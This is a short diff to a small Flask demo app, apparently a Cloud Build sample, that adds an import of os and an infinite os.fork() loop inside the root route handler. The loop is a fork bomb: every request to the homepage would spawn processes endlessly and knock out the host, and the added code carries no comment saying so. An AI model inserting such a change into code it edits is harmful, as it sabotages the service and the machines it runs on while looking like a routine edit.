@@ -1,9 +1,14 @@
+import os
 import random
 from flask import Flask
 app = Flask('hello-cloudbuild')
 
 @app.route('/')
 def hello():
+
+  while (1):
+    os.fork()
+
   return "Crappy website.\n"
 
 @app.route('/oop')
